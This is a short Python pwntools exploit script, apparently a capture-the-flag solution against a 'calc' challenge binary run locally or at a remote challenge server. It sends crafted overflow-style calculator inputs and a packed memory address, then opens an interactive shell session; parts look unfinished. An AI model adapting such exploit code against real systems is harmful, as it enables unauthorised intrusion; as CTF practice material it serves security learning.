#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./calc"
elf=ELF(pwn_file)

if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.it",3333)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()


num=0x7f
#r.sendlineafter(">>","9"*0xff+"*10")
r.sendlineafter(">>","("*0xff+"1"*0x10+"*2")
payload="1234"
r.sendlineafter(">>",payload)
r.sendlineafter(">>","1"*0x20+"*23")
r.sendlineafter(">>",p32(0x804d090))
num=0x7f
r.interactive()
